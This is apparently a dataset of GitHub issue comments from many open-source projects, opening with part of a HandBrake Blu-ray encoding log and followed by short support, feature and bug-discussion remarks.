true,     ""ColorMatrixCode"" 0,     ""Options"" ""weightb=1open-gop=0scenecut=40rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=allno-dct-decimate=1deblock=-1,-1"",     ""QSV"" {       ""Decode"" true,       ""AsyncDepth"" 0     }   } } [025628] CPU Intel(R) Core(TM) i7-3770 CPU @ 3.40GHz [025628]  - Intel microarchitecture Ivy Bridge [025628]  - logical processor count 8 [025628] Intel Quick Sync Video support yes [025628]  - Intel Media SDK software API 1.23 (minimum 1.3) [025628]  - H.264 encoder yes [025628]     - preferred implementation software (null) [025628]     - capabilities (software)  bpyramid vsinfo opt1 opt2 [025628]  - H.265 encoder no [025628] hb_scan path=U\, title_index=1 src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar [025628] scan BD has 19 title(s) [025628] bd scanning title 1 [025628] bd playlist 00000.MPLS [025628] bd duration is 020650 (7610269 ms) [025628] bd video id=0x1011, stream type=H.264, format 1080p [025628] bd aspect = 169 [025628] bd audio id=0x761100, lang=English (AC3), 3cc=eng [025628] bd audio id=0x721100, lang=English (TrueHD), 3cc=eng [025628] bd audio id=0x1101, lang=Francais (AC3), 3cc=fra [025628] bd audio id=0x1102, lang=español (AC3), 3cc=spa [025628] bd audio id=0x1103, lang=English (AC3), 3cc=eng [025628] bd subtitle id=0x1200, lang=English [PGS], 3cc=eng [025628] bd subtitle id=0x1201, lang=English [PGS], 3cc=eng [025628] bd subtitle id=0x1202, lang=Francais [PGS], 3cc=fra [025628] bd subtitle id=0x1203, lang=español [PGS], 3cc=spa [025628] bd subtitle id=0x1204, lang=Portugues [PGS], 3cc=por [025628] bd subtitle id=0x1205, lang=Francais [PGS], 3cc=fra [025628] bd subtitle id=0x1206, lang=español [PGS], 3cc=spa [025628] bd chap 1 packet=768, 717216 ms [025628] bd chap 2 packet=3734035584, 467884 ms [025628] bd chap 3 packet=6214336896, 504003 ms [025628] bd chap 4 packet=8885081472, 444402 ms [025628] bd chap 5 packet=11234502336, 516891 ms [025628] bd chap 6 packet=13994168448, 491324 ms [025628] bd chap 7 packet=16621220352, 551884 ms [025628] bd chap 8 packet=19544962368, 606480 ms [025628] bd chap 9 packet=22751003520, 539413 ms [025628] bd chap 10 packet=25570130112, 415790 ms [025628] bd chap 11 packet=27759434880, 534283 ms [025628] bd chap 12 packet=30594421440, 484692 ms [025628] bd chap 13 packet=33140312448, 519143 ms [025628] bd chap 14 packet=35858720256, 307140 ms [025628] bd chap 15 packet=37505899392, 509467 ms [025628] bd chap 16 packet=39567801216, 250 ms [025628] bd title 1 has 16 chapters [025628] scan decoding previews for title 1 [025628] scan title angle(s) 1 [025628] scan audio 0x721100 truehd, rate=48000Hz, bitrate=128000 English (TrueHD) (5.1 ch) [025628] scan audio 0x1103 ac3, rate=48000Hz, bitrate=224000 English (AC3) (2.0 ch) [025628] scan audio 0x761100 ac3, rate=48000Hz, bitrate=640000 English (AC3) (5.1 ch) [025628] scan audio 0x1101 ac3, rate=48000Hz, bitrate=640000 Francais (AC3) (5.1 ch) [025628] scan audio 0x1102 ac3, rate=48000Hz, bitrate=640000 español (AC3) (5.1 ch) [025630] scan 10 previews, 1920x1080, 23.976 fps, autocrop = 140/140/0/0, aspect 169, PAR 11 [025630] scan supported video decoders avcodec qsv [025630] stream 10 good frames, 0 errors (0%) [025630] libhb scan thread found 1 valid title(s) [025630] starting job [025630] yadif thread started for segment 0 [025630] yadif thread started for segment 1 [025630] yadif thread started for segment 3 [025630] yadif thread started for segment 2 [025630] yadif thread started for segment 4 [025630] yadif thread started for segment 5 [025630] yadif thread started for segment 6 [025630] yadif thread started for segment 7 [025630] job configuration [025630]  * source [025630]    + U\ [025630]    + title 1, chapter(s) 1 to 16 [025630]  * destination [025630]    + J\RIP\MKV\Startrek 11.mkv [025630]    + container Matroska (libavformat) [025630]      + chapter markers [025630]  * video track [025630]    + decoder h264_qsv [025630]      + bitrate 200 kbps [025630]    + filters [025630]      + Detelecine (pullup) () [025630]      + Decomb (mode=7) [025630]      + Framerate Shaper (mode=1) [025630]        + frame rate 23.976 fps -&gt; constant 23.976 fps [025630]      + Crop and Scale (width=1920height=800crop-top=140crop-bottom=140crop-left=0crop-right=0) [025630]        + source 1920 * 1080, crop (140/140/0/0) 1920 * 800, scale 1920 * 800 [025630]    + Output geometry [025630]      + storage dimensions 1920 x 800 [025630]      + pixel aspect ratio 1  1 [025630]      + display dimensions 1920 x 800 [025630]  * Foreign Audio Search Passthrough, Forced Only, Default [025630]    + subtitle, English [PGS] (track 0, id 0x1200, Picture) [025630]    + subtitle, English [PGS] (track 1, id 0x1201, Picture) src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar [025630] sync expecting 182464 video frames src/libbluray/bluray.c696 Skipping broken unit at 6708854784 [025820] reader done. 1 scr changes [025820] work average encoding speed for job is 0.000000 fps [025820] decomb deinterlaced 0 | blended 0 | unfiltered 0 | total 0 [025820] vfr 0 frames output, 0 dropped and 0 duped for CFR/PFR [025820] vfr lost time 0 (0 frames) [025820] vfr gained time 0 (0 frames) (0 not accounted for) [025820] stream 30674 good frames, 0 errors (0%) [025820] sync got 0 frames, 182464 expected [025820] Subtitle track 0 (id 0x1200) 'English [PGS]' 206 hits (0 forced) [025820] Subtitle track 1 (id 0x1201) 'English [PGS]' 268 hits (0 forced) [025820] No candidate detected during subtitle scan [025820] starting job [025820] yadif thread started for segment 0 [025820] yadif thread started for segment 1 [025820] yadif thread started for segment 2 [025820] yadif thread started for segment 3 [025820] yadif thread started for segment 4 [025820] yadif thread started for segment 5 [025820] yadif thread started for segment 6 [025820] yadif thread started for segment 7 [025820] Auto Passthru allowed codecs are AC3, TrueHD, DTS, DTS-HD [025820] Auto Passthru fallback is AC3 [025820] Auto Passthru using AC3 Passthru for track 1 [025820] Auto Passthru using TrueHD Passthru for track 2 [025820] Auto Passthru using AC3 Passthru for track 3 [025820] job configuration [025820]  * source [025820]    + U\ [025820]    + title 1, chapter(s) 1 to 16 [025820]  * destination [025820]    + J\RIP\MKV\Startrek 11.mkv [025820]    + container Matroska (libavformat) [025820]      + chapter markers [025820]  * video track [025820]    + decoder h264_qsv [025820]      + bitrate 200 kbps [025820]    + filters [025820]      + Detelecine (pullup) () [025820]      + Decomb (mode=7) [025820]      + Framerate Shaper (mode=1) [025820]        + frame rate 23.976 fps -&gt; constant 23.976 fps [025820]      + Crop and Scale (width=1920height=800crop-top=140crop-bottom=140crop-left=0crop-right=0) [025820]        + source 1920 * 1080, crop (140/140/0/0) 1920 * 800, scale 1920 * 800 [025820]    + Output geometry [025820]      + storage dimensions 1920 x 800 [025820]      + pixel aspect ratio 1  1 [025820]      + display dimensions 1920 x 800 [025820]    + encoder H.264 (libx264) [025820]      + options weightb=1open-gop=0scenecut=40rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=allno-dct-decimate=1deblock=-1,-1 [025820]      + bitrate 10000 kbps, pass 1 [025820]      + fast first pass [025820]      + options ref=18x8dct=0me=diatrellis=0 [025820]                 analyse=i4x4 (if originally enabled, else analyse=none) [025820]                 subq=2 (if originally greater than 2, else subq unchanged) [025820]  * subtitle track 1, English [PGS] (track 0, id 0x1200, Picture) -&gt; Passthrough [025820]  * subtitle track 2, English [PGS] (track 1, id 0x1201, Picture) -&gt; Passthrough [025820]  * audio track 1 [025820]    + decoder English (AC3) (5.1 ch) (track 1, id 0x761100) [025820]      + bitrate 640 kbps, samplerate 48000 Hz [025820]    + AC3 Passthru [025820]  * audio track 2 [025820]    + decoder English (TrueHD) (5.1 ch) (track 2, id 0x721100) [025820]      + bitrate 128 kbps, samplerate 48000 Hz [025820]    + TrueHD Passthru [025820]  * audio track 3 [025820]    + decoder English (AC3) (2.0 ch) (track 5, id 0x1103) [025820]      + bitrate 224 kbps, samplerate 48000 Hz [025820]    + AC3 Passthru src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar [025820] sync expecting 182464 video frames [025820] encx264 min-keyint 24, keyint 240 [025820] encx264 encoding at average bitrate 10000 [025820] encx264 unparsed options open-gop=0rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=alldeblock=-1,-1dct-decimate=0 x264 [info] using SAR=1/1 x264 [info] using cpu capabilities MMX2 SSE2Fast SSSE3 SSE4.2 AVX x264 [info] profile Main, level 4.0 [025820] sync first pts audio 0x721100 is 0 [025821] sync first pts audio 0x1103 is 0 [025821] sync first pts video is 0 [025821] sync ""Chapter 1"" (1) at frame 1 time 0 [025821] sync first pts audio 0x761100 is 0 [025905] sync first pts subtitle 0x1201 is 5551796 [025922] sync first pts subtitle 0x1200 is 7105848 [030934] sync ""Chapter 2"" (2) at frame 17197 time 64549485 [031651] sync ""Chapter 3"" (3) at frame 28415 time 106659052 src/libbluray/bluray.c696 Skipping broken unit at 6708854784 [031819] reader done. 1 scr changes [031822] work average encoding speed for job is 25.551609 fps [031822] decomb deinterlaced 30672 | blended 0 | unfiltered 0 | total 30672 [031822] vfr 30674 frames output, 0 dropped and 2 duped for CFR/PFR [031822] vfr lost time 3754 (0 frames) [031822] vfr gained time 3754 (4 frames) (0 not accounted for) [031822] stream 30674 good frames, 0 errors (0%) [031822] ac3-decoder done 39958 frames, 0 decoder errors [031822] truehd-decoder done 1534426 frames, 0 decoder errors [031822] ac3-decoder done 39971 frames, 0 decoder errors [031822] h264_qsv-decoder done 30673 frames, 0 decoder errors [031823] sync got 30673 frames, 182464 expected [031823] sync framerate min 7.992 fps, max 23.981 fps, avg 23.974 fps x264 [info] frame I177   Avg QP15.69  size159915 x264 [info] frame P9051  Avg QP19.52  size 71527 x264 [info] frame B21446 Avg QP19.58  size 42785 x264 [info] consecutive B-frames  8.6%  7.9% 15.9% 11.0% 12.0% 35.7%  4.2%  1.8%  2.8% x264 [info] mb I  I16..4 42.6%  0.0% 57.4% x264 [info] mb P  I16..4 69.8%  0.0%  0.0%  P16..4 26.6%  0.0%  0.0%  0.0%  0.0%    skip 3.5% x264 [info] mb B  I16..4 26.5%  0.0%  0.0%  B16..8 29.0%  0.0%  0.0%  direct23.1%  skip21.4%  L037.4% L137.5% BI25.1% x264 [info] final ratefactor 18.48 x264 [info] direct mvs  spatial99.7% temporal0.3% x264 [info] coded y,uvDC,uvAC intra 82.2% 62.0% 33.5% inter 36.7% 28.6% 5.0% x264 [info] i16 v,h,dc,p 20% 17% 41% 22% x264 [info] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu 17% 17% 17%  9%  9%  8%  8%  8%  7% x264 [info] i8c dc,h,v,p 56% 19% 19%  6% x264 [info] Weighted P-Frames Y6.1% UV4.6% x264 [info] kb/s9962.88 [031823] starting job [031823] yadif thread started for segment 0 [031823] yadif thread started for segment 1 [031823] yadif thread started for segment 2 [031823] yadif thread started for segment 3 [031823] yadif thread started for segment 4 [031823] yadif thread started for segment 5 [031823] yadif thread started for segment 6 [031823] yadif thread started for segment 7 [031823] Auto Passthru allowed codecs are AC3, TrueHD, DTS, DTS-HD [031823] Auto Passthru fallback is AC3 [031823] Auto Passthru using AC3 Passthru for track 1 [031823] Auto Passthru using TrueHD Passthru for track 2 [031823] Auto Passthru using AC3 Passthru for track 3 [031823] job configuration [031823]  * source [031823]    + U\ [031823]    + title 1, chapter(s) 1 to 16 [031823]  * destination [031823]    + J\RIP\MKV\Startrek 11.mkv [031823]    + container Matroska (libavformat) [031823]      + chapter markers [031823]  * video track [031823]    + decoder h264_qsv [031823]      + bitrate 200 kbps [031823]    + filters [031823]      + Detelecine (pullup) () [031823]      + Decomb (mode=7) [031823]      + Framerate Shaper (mode=1) [031823]        + frame rate 23.976 fps -&gt; constant 23.976 fps [031823]      + Crop and Scale (width=1920height=800crop-top=140crop-bottom=140crop-left=0crop-right=0) [031823]        + source 1920 * 1080, crop (140/140/0/0) 1920 * 800, scale 1920 * 800 [031823]    + Output geometry [031823]      + storage dimensions 1920 x 800 [031823]      + pixel aspect ratio 1  1 [031823]      + display dimensions 1920 x 800 [031823]    + encoder H.264 (libx264) [031823]      + options weightb=1open-gop=0scenecut=40rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=allno-dct-decimate=1deblock=-1,-1 [031823]      + bitrate 10000 kbps, pass 2 [031823]  * subtitle track 1, English [PGS] (track 0, id 0x1200, Picture) -&gt; Passthrough [031823]  * subtitle track 2, English [PGS] (track 1, id 0x1201, Picture) -&gt; Passthrough [031823]  * audio track 1 [031823]    + decoder English (AC3) (5.1 ch) (track 1, id 0x761100) [031823]      + bitrate 640 kbps, samplerate 48000 Hz [031823]    + AC3 Passthru [031823]  * audio track 2 [031823]    + decoder English (TrueHD) (5.1 ch) (track 2, id 0x721100) [031823]      + bitrate 128 kbps, samplerate 48000 Hz [031823]    + TrueHD Passthru [031823]  * audio track 3 [031823]    + decoder English (AC3) (2.0 ch) (track 5, id 0x1103) [031823]      + bitrate 224 kbps, samplerate 48000 Hz [031823]    + AC3 Passthru src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar src/libbluray/bdj/bdj.c549 libbluray-j2se-1.0.2.jar not found. src/libbluray/bdj/bdj.c695 BD-J check Failed to load libbluray.jar [031823] sync expecting 30673 video frames [031823] encx264 min-keyint 24, keyint 240 [031823] encx264 encoding at average bitrate 10000 [031823] encx264 unparsed options open-gop=0rc-lookahead=60chroma-me=1fast-pskip=0nr=0bluray-compat=0constrained-intra=0b-bias=0intra-refresh=0ref=4bframes=8b-adapt=2direct=autome=umhsubme=9merange=24analyse=alldeblock=-1,-1dct-decimate=0 x264 [info] using SAR=1/1 x264 [info] using cpu capabilities MMX2 SSE2Fast SSSE3 SSE4.2 AVX x264 [info] profile High, level 4.0 [031823] sync first pts audio 0x721100 is 0 [031824] sync first pts audio 0x1103 is 0 [031824] sync first pts audio 0x761100 is 0 [031824] sync first pts video is 0 [031824] sync ""Chapter 1"" (1) at frame 1 time 0 [031942] sync first pts subtitle 0x1201 is 5551796 [032022] sync first pts subtitle 0x1200 is 7105848 [034415] sync ""Chapter 2"" (2) at frame 17197 time 64549485 [040046] sync ""Chapter 3"" (3) at frame 28415 time 106659052 src/libbluray/bluray.c696 Skipping broken unit at 6708854784 [040357] reader done. 1 scr changes [040407] work average encoding speed for job is 11.197354 fps [040407] decomb deinterlaced 30672 | blended 0 | unfiltered 0 | total 30672 [040407] vfr 30674 frames output, 0 dropped and 2 duped for CFR/PFR [040407] vfr lost time 3754 (0 frames) [040407] vfr gained time 3754 (4 frames) (0 not accounted for) [040407] stream 30674 good frames, 0 errors (0%) [040407] ac3-decoder done 39958 frames, 0 decoder errors [040407] truehd-decoder done 1534426 frames, 0 decoder errors [040407] ac3-decoder done 39971 frames, 0 decoder errors [040407] h264_qsv-decoder done 30673 frames, 0 decoder errors [040407] sync got 30673 frames, 30673 expected [040407] sync framerate min 7.992 fps, max 23.981 fps, avg 23.974 fps x264 [info] frame I177   Avg QP17.15  size145081 x264 [info] frame P9051  Avg QP19.89  size 73396 x264 [info] frame B21446 Avg QP20.33  size 42385 x264 [info] consecutive B-frames  8.6%  7.9% 15.9% 11.0% 12.0% 35.7%  4.2%  1.8%  2.8% x264 [info] mb I  I16..4 14.2% 69.1% 16.7% x264 [info] mb P  I16..4  6.0% 29.3%  4.2%  P16..4 37.5% 13.3%  6.3%  0.2%  0.0%    skip 3.3% x264 [info] mb B  I16..4  1.0%  4.5%  0.6%  B16..8 44.1% 11.6%  2.7%  direct10.5%  skip25.0%  L048.2% L146.2% BI 5.6% x264 [info] 8x8 transform intra74.0% inter59.2% x264 [info] direct mvs  spatial98.3% temporal1.7% x264 [info] coded y,uvDC,uvAC intra 86.1% 79.6% 52.9% inter 46.5% 43.0% 10.5% x264 [info] i16 v,h,dc,p 18% 21% 19% 41% x264 [info] i8 v,h,dc,ddl,ddr,vr,hd,vl,hu  6%  6%  5% 12% 17% 14% 16% 11% 12% x264 [info] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu  5%  6%  2% 12% 17% 15% 18% 12% 14% x264 [info] i8c dc,h,v,p 44% 23% 16% 17% x264 [info] Weighted P-Frames Y6.1% UV4.6% x264 [info] ref P L0 53.8% 10.5% 22.0% 12.0%  1.7%  0.1% x264 [info] ref B L0 80.8% 16.1%  3.1% x264 [info] ref B L1 92.3%  7.7% x264 [info] kb/s9998.64 [040407] mux track 0, 30674 frames, 1598977795 bytes, 9998.60 kbps, fifo 512 [040407] mux track 1, 39958 frames, 102292480 bytes, 639.65 kbps, fifo 512 [040407] mux track 2, 1534426 frames, 578997900 bytes, 3620.54 kbps, fifo 32768 [040407] mux track 3, 39971 frames, 35814016 bytes, 223.95 kbps, fifo 512 [040407] mux track 4, 411 frames, 5277905 bytes, 33.00 kbps, fifo 16 [040407] mux track 5, 535 frames, 6521743 bytes, 40.78 kbps, fifo 32 [040407] libhb work result = 0  # Encode Completed ...  ",False,True
dynamorio/DynamoRIO/682/48427436,dynamorio/DynamoRIO/682,"From zhao...@friend.com on February 14, 2012 164937 instr_compute_address_ex does not provide the information of which opnd is used for computing address. New api should be added, instr_compute_address_ex_priv should be extended. Original issue ",False,True
editor-layer-index/osmlab/574/433585523,editor-layer-index/osmlab/574,"Sometimes the build is broken - this is just a fact of development.  It happens to this index sometimes.  When it happens, Potlatch doesn't work. For iD, I'm much more comfortable depending on software that's been published by a human.  Someone should take a quick look at it and say ""ok looks good"" before incrementing the version number and typing .  That's not really asking a lot.  This index doesn't really change much. Before I publish a new version of iD, I grab the latest copy of ELI, run my script on it, and do a  to see what actually got changed. Instead - when ELI does change, semantic versioning can be used to signal to downstream projects how disruptive the change is.  A change to an imagery source in the index could be a patch release, and iD could pull these automatically.   A new property added to the schema could be a minor release.  It would be easy to handle but I'd probably want to prepare for it.   Renaming / removing a property / changing the schema would be a major release, and would break downstream projects. ELI should be allowed to do this for good reasons.  ",False,True
AKS/Azure/287/412077965,AKS/Azure/287,"This is a deal breaker for us as we require running most workloads on standard VMs while CPU intensive workloads require special CPU hardware like the F series VMs.  It's also critical for migrating to VMs with larger OS disks. Otherwise, when disks are too small, the kubelet starts evicting pods due to the  signal. ",False,True
Ghost-CLI/TryGhost/678/374514271,Ghost-CLI/TryGhost/678,"Alright....    Nobody accused you 'falsely' you clearly were not respectful    Your issue does neither have a title nor any other description. You were starting this issue with asking what the password is for, which is clearly a support question. This was listed as ""1."", but never followed by a ""2."".  With our issue template we ask you to supply information, which you didn't do. At no point whatsoever did you say which node version, OS, CLI, or Ghost version you're having issue with. Hence there is no way to reproduce what you are experiencing.  Support is only offered by the community in our Slack community and not here on GitHub. We ask you to respect our project and the people that are contributing to it. If - after looking further into it and gathering more necessary information - it turns out to be an issue with the CLI, we can always reopen it again.   ",False,True
manageiq/ManageIQ/1210/66508237,manageiq/ManageIQ/1210,"Wait, I think the PR tltle is backwards or maybe I'm misreading.  If the code it blowing up on  then that is testing .descendants, not .all_resource_pools. ",False,True
Elgg/Elgg/12126/410196664,Elgg/Elgg/12126,Just remembered that we upgraded the client (on a test environment) to 3.0 with MariaDB. so it can work. ,False,True
Kosmos/AtlasNX/187/465068060,Kosmos/AtlasNX/187,That option should only exist if es patches are installed already prior. ,False,True
rdpwrap/stascorp/645/456341428,rdpwrap/stascorp/645,"I do not wanted to spam this issue, but just confirm that release exist too on our side. ) ",False,True
Skript/SkriptLang/1568/425710866,Skript/SkriptLang/1568,so get the 1.12 versions of those plugins ,False,True
rdpwrap/stascorp/611/448213818,rdpwrap/stascorp/611,"@friend wrote X64  Windows 10 Pro x64 17763.194 worked.  … OK  X86 Windows 10 Pro x86 17763.194 not work with section from .ini for 10.0.17763.168 … works in my Testbed VM/Vbox ??  which data sections did you implement ??  17763.1 , 17763-SLinit and also 17763.168, 17763.168-SLInit ?? Which file Version do you see in the properties for the termsrv.dll ?? ",False,True
freeCodeCamp/freeCodeCamp/10163/286142287,freeCodeCamp/freeCodeCamp/10163,"I'd like to raise a few questions about this. Having looked at the hint structure, I think we should make some changes.  The hint currently accepts only plain-text whereas most of the MDN resources are links. The hint generates a toast to which we could add an action link, but I wonder if using a dropdown on the hint button might not be a better approach. Alternatively, if we could limit the number of hints on each exercise to 1 hint, we could do away with the toast and have a one-click hint button to open the resource in a new tab.  Thought on any of this? ",False,True
bootstrap/twbs/3057/6797474,bootstrap/twbs/3057,"@friend Look at the bottom of this page, below the ""Comment on this issue"" button ",False,True
GPMS/BoiseProjects/10/117483880,GPMS/BoiseProjects/10,Create a grid to bind all Proposal list ,False,True
monassis-ticket-test/monassis-server/111/10193487,monassis-ticket-test/monassis-server/111,@friend The live Monassis server could not be pinged. Received the following message 'Connection refused' ,False,True
rdpwrap/stascorp/645/456703233,rdpwrap/stascorp/645,"@friend no it can't, until the support is officially added. ",False,True
zfs/zfsonlinux/7401/379847631,zfs/zfsonlinux/7401,"The patches that apply to cp as far as what gdb claims its source files are (with patches editing only test cases that do not apply to the cp binary removed) is the same as I got after processing the gdb output from Gentoo's cp, which is The changes in  look questionable to me, but I don't see a smoking gun. Testing it on Gentoo after applying these patches should allow us to figure out which one is making it reproducible. My guess is . ",False,True
ansible/ansible/13262/315111502,ansible/ansible/13262,This so needs to get done. I was going through my code and chased this up from last year. This is a perfectly valid use case. ,False,True
jenkins/jenkinsci/2355/155098677,jenkins/jenkinsci/2355,Alternative approach to fixing JENKINS-34857. Could be preferred to #2354 @friend WDYT? ,False,True
ansible/ansible/13262/267381019,ansible/ansible/13262,"plus one just googled for how to do this and ended up here, fwiw. ",False,True
npm/npm/21202/404565813,npm/npm/21202,@friend plus one on that but I don't know why NPM rejected this - it was a majorly a good security practice ,False,True
rdpwrap/stascorp/601/445551658,rdpwrap/stascorp/601,"@friend wrote   Despite the description I don't seem to get it working in 17763.168 …... „I did not fiddle with the dlls.“  ……  BTW still fighting with virusscanner too … maybe this disturbes Things       &gt;&gt;    (!yes may be!)        &gt;&gt;    ?? ( Which one do you use ?         &gt;&gt;     !! Some do strictly forbid                     making changes in surveyed/observed (System) areas.                  ! – use $MS Defender only ,  I  had never a Problem with it – but with others                  !  Try to Keep it Simple (K.I.S.S.) at least for the implementation phase  …..   and … termservice crashes..        &gt;&gt;    ??  ‚When‘ and ‚What‘ is the message  or Event id ?  There is no „fiddling“ necessary  , except If you really want to test manually several builds of  “termsrv.dll“, which is not the normal workflow.  So I did it  just straight „Forward“  Use at the first time install or update Win10 and  use the „Install.bat“  ( only once, with Option -o) to get the updated Version of rdpwrap.ini of the repository {2018-10-10), otherwise you receive with rpd-wrap 1.62 the ini-file 2017-12-27 net stop termservice (elevated) and  watch Messages in  the admin-console (see my batch cmd proposal) edit rdpwrap.ini with the updated [section-version] according to your termsrv.dll in system32. net start termservice (elevated) and  watch Messages in  the admin-console just see my result at  last post (hajubu- 18-12-09) in #606    ",False,True
openDCIM/samilliken/1114/450224927,openDCIM/samilliken/1114,"So in other words, you do not support RF2307, only your self determined Schema's. Too bad. ",False,True
rdpwrap/stascorp/601/453223003,rdpwrap/stascorp/601,tell it to cmhowarth ;) ,False,True
bootstrap/twbs/24475/339023504,bootstrap/twbs/24475,"If you had asked me, which you did not, I would have said that ... Why don't you create a `param´ shortcode which fetches a given variable by name and, if not found, exits with -1 and prints ""ERROR Variable ""foo"" in page ""/path/to/page.md"" does not exist"". Which would be pretty great error handling. Oh, and not only can shortcodes have great error handling, they can also be both inline and used as blocks, they can be nested as you please ... But you didn't, and if you want to have that ""half empty"" attitude looking for blockers, that is fine. I thought having Bootstrap run its documentation site on Hugo would be cool for Hugo, and wanted to chime in with some support. But that support voucher requires a slightly different approach to have any longevity. I have edited enough big Hugo docs sites to be pretty certain that it would have been worth it. I'd even be willing to throw away some functionality to get there. But up to you. ",False,True
openDCIM/samilliken/1114/450250964,openDCIM/samilliken/1114,"Our schema already has a 'cn' attribute in the userobject. You are the clueless one.  Look up groups under RFC2307.  They do NOT use 'cn', they use either member, memberOf, or memberUid.  These are NOT attached to the userObject at all. This is NOT active directory.  This is openldap running a RFC2307 schema. ",False,True
react-helmet/nfl/373/407980133,react-helmet/nfl/373,"I believe you can also work around this by applying a unique  prop to the  component, for example . Perhaps a bit cleaner than using the props method above. ",False,True
zfs/zfsonlinux/7401/379899335,zfs/zfsonlinux/7401,Our analysis is not finished. I am reopening this pending the completion of our analysis. ,False,True
Osmand/osmandapp/3663/296354175,Osmand/osmandapp/3663,"@friend When I read your comment about ""Prepare yourself ..."" and so on, this sounds in deed very clumsy and obsolete. Looks like there is simply a translation issue here with whatever language you are using In English our prompt is simply ""After about 1 km enter a roundabout."", which is short an unobtrusive. If you let me know an equally short translation for your language I can easily fix this prompt (independent of anything bigger we may or may not do about trying to discriminate between larger and smaller roundabouts). @friend I never hear keep left or keep right when passing any motorway exits I am not supposed to take, can you please specify specific locations so we can reproduce? Regarding ""slight turns"" While it is not very easy to always determine the turn angle as it appears to a driver in the real world, it is in deed conventional in all navigation systems I have tested to try and prompt slight and sharp turns. This is useful in cases of forks (where there is really less of an actual ""turn"" to be made), or e.g. in case of 3-way forks to indicate which of these to take. I cannot see that dropping our attempt to announce slight or sharp turns would actually be a general improvement. ",False,True
forum/standardnotes/39/454919967,forum/standardnotes/39,"I love the concept of Standard Notes. Making me go to the mouse for every action feels like a deal breaker. @friend This is a real tricky reply.  It's been on the roadmap for a year, no progress that I can see. Turning away folks from helping feels like the opposite of progress on this. Unless, reading between the lines, what you're really saying is you expect it to be released in the next month or so? -) ",False,True
qTox/tux3/600/61403719,qTox/tux3/600,"If we start adding messages in the chat about what happens with call, we might as well do it not just when someone rejects a call, so let's make another issue for that. ",False,True
shinymaterial/ericrayanderson/46/327083591,shinymaterial/ericrayanderson/46,I want to disable title bar from material page where it is default.is there a way I can do that. ,False,True
ansible/ansible/13262/372756228,ansible/ansible/13262,"@friend That doesn't help with the problem presented here. All you're doing with anchors is defining a var on the fly vs defining it with a vars file or an argument. It will still execute your  task twice and then your  task twice, where the intent of this ticket is to allow running the  task, then the  task, then running them both again. (x2, x2) vs (, )x2 ",False,True
rails/rails/1917/1478192,rails/rails/1917,"@friend Ok, now I finally understand the rationale for this, perhaps parts of what you just said should also be part of documentation, so that it's harder for other people to miss the point as well. ",False,True
langs/fluxbb/121/169797727,langs/fluxbb/121,It wont let me pull these so i do them single ,False,True
jekyll/jekyll/6948/397043183,jekyll/jekyll/6948,"@friend You can use Disqus or some similar software for that, it's way outside the scope of Jekyll as a static site generator. ",False,True
react-helmet/nfl/373/446162172,react-helmet/nfl/373,"My application crashes frequently due to this bug. If this bug isn't resolved before our product launch, I'm forced to replace it with another lib / my own implementation 😕 I guess it's not too hard to release a v5 patch? Has nothing to do with the current work on v6 right? ",False,True
zfs/zfsonlinux/7401/379870309,zfs/zfsonlinux/7401,With @friend 's script I can immediately reproduce this on 64-bit Ubuntu 16.04 (kernel 4.4.0-109-generic) with ZFS 0.7.7. It fails as expected ` ,False,True
flutter_webview_plugin/dart-flitter/60/380036810,flutter_webview_plugin/dart-flitter/60,if you launch a web server you should not have problem here is an example ,False,True
core/owncloud/27775/298196122,core/owncloud/27775,Updated with relevant information. ,False,True
core/owncloud/27775/301121562,core/owncloud/27775,"I've been having, as already stated, the exact same problem for a month so far. Cleaning the partial apt directory won't fix it (nor won't fix it the clean apt command). Francesco Menghetti ",False,True
bety/PecanProject/568/368940250,bety/PecanProject/568,I went with option 2 (eliminating the 100-item limit) to fix the problem mentioned above. ,False,True
rack/rack/1016/186241393,rack/rack/1016,I've spotted a couple of small improvements I can make - I'll close this will I work on those. ,False,True
mame/mamedev/4469/451425519,mame/mamedev/4469,Do not engage in abusive language towards team members or you will find your access to the project curtailed. ,False,True
documentation/nextcloud/1142/455543645,documentation/nextcloud/1142,@friend We're on GitLab not your website so your CoC does not apply.  I never was rude or violated GL's CoC.  There are people trying to work here.  Please don't waste our time. ,False,True
ansible/ansible/13262/226082594,ansible/ansible/13262,"@friend I believe there are performance implications to looping over includes, and sometimes it is necessary to run tasks 1, 2, and 3 as a group, in that order, an arbitrary number of times determined by some other factor. ",False,True
rails/rails/1917/1477448,rails/rails/1917,"@friend thanks for that - any chance you can document the handle_unverified_request method? @friend I closed it because I knew that someone like @friend would fix it and if I left it open then before too long we'll be back to where we were with the LH tracker and we'd have HN articles screaming ""OMG! Rails has a thousand bugs"". As for the hyperbole in your reply - no it's not a serious problem, it's not the first time that docs have been incorrect (it won't be the last either) and I think ‘completely’ out of date is a little bit of exaggeration don't you think. I'm sorry you lost some time due to this but this kind of thing happens to all of us. ",False,True
